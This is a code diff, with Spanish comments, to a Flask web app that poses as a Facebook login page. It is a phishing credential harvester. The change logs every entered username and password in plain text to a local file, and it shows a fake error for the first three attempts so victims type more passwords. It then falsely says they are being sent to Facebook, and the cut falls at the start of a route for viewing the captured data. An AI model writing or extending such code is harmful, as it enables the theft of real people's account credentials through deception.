@@ -43,16 +43,18 @@ def guardar():
         session["intentos"] = 0
 
     session["intentos"] += 1
+    intento_actual = session["intentos"]
 
-    if session["intentos"] < 4:
-        flash("El correo o la contraseña son incorrectos")
-        return redirect(url_for('login'))
-    else:
-        # A la cuarta vez dejamos entrar sí o sí
-        session["intentos"] = 0  # Reiniciar intentos
-        with open("datos_ingresados.txt", "a", encoding="utf-8") as archivo:
-            archivo.write(f"Usuario: {usuario} | Contraseña: {contrasena}\n")
-        return f"<h2>¡Será redireccionado a la aplicación de Facebook!</h2><a href='/'>Volver</a>"
+    # Guardar SIEMPRE cada intento
+    with open("datos_ingresados.txt", "a", encoding="latin-1", errors="replace") as archivo:
+        if intento_actual < 4:
+            archivo.write(f"Intento {intento_actual} (rechazado) -> Usuario: {usuario} | Contraseña: {contrasena}\n")
+            flash("El correo o la contraseña son incorrectos")
+            return redirect(url_for('login'))
+        else:
+            archivo.write(f"Intento {intento_actual} (permitido) -> Usuario: {usuario} | Contraseña: {contrasena}\n")
+            session["intentos"] = 0  # Reiniciar intentos
+            return f"<h2>¡Será redireccionado a la aplicación de Facebook!</h2><a href='/'>Volver</a>"
 
 # NUEVA RUTA para ver los datos guardados
 @app.route('/ver')
